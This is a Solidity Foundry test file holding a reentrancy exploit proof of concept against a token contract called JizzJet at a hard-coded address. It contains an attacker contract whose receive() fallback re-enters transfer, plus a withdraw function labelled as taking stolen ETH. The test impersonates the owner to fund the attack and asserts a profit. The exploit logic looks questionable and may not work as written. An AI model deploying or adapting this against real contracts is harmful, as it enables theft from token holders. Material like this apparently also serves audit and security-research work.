// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IJizzJet {
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function owner() external view returns (address);
}

contract AttackerContract {
    IJizzJet public target;
    uint256 public reentrancyCount = 0;
    uint256 public maxReentrancy = 3; // Limit to avoid out of gas
    bool public attacking = false;

    constructor() {
        target = IJizzJet(0xF2A7429641d1b49a13dCB7E23b67a1a5101231F2);
    }

    function attack() external {
        // Start the attack by transferring tokens to ourselves
        // This will trigger swapAndLiquify if conditions are met
        uint256 myBalance = target.balanceOf(address(this));
        require(myBalance > 0, "No tokens to attack");

        attacking = true;
        // Transfer to ourselves to trigger _transfer
        target.transfer(address(this), 1);
        attacking = false;
    }

    receive() external payable {
        if (attacking && reentrancyCount < maxReentrancy) {
            reentrancyCount++;
            // Re-enter by making another transfer
            // Use a small amount to avoid hitting maxTxAmount
            target.transfer(address(this), 1);
        }
    }

    // Function to withdraw stolen ETH
    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xF2A7429641d1b49a13dCB7E23b67a1a5101231F2;
    address attackerContract;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Create attacker contract instance
        attackerContract = address(new AttackerContract());

        // Get some JizzJet tokens to attacker
        // First, get tokens from owner or another holder
        vm.startPrank(IJizzJet(TARGET).owner());
        // Transfer some tokens to attacker
        uint256 initialTokens = IJizzJet(TARGET).balanceOf(IJizzJet(TARGET).owner()) / 100; // 1% of owner's balance
        IJizzJet(TARGET).transfer(attackerContract, initialTokens);
        vm.stopPrank();

        // Also ensure target contract has accumulated fees
        // We can make some transfers to build up contract balance
        vm.startPrank(IJizzJet(TARGET).owner());
        // Transfer to a non-excluded address to incur fees
        address someUser = address(0x123);
        IJizzJet(TARGET).transfer(someUser, 1000 * 10**18);
        vm.stopPrank();
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;
        // Start the attack
        AttackerContract(attackerContract).attack();

        // Check profit - attacker's ETH balance should increase
        uint256 attackerBalanceAfter = attackerContract.balance;
        assertGt(attackerBalanceAfter, 0, "Attacker should have gained ETH");
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
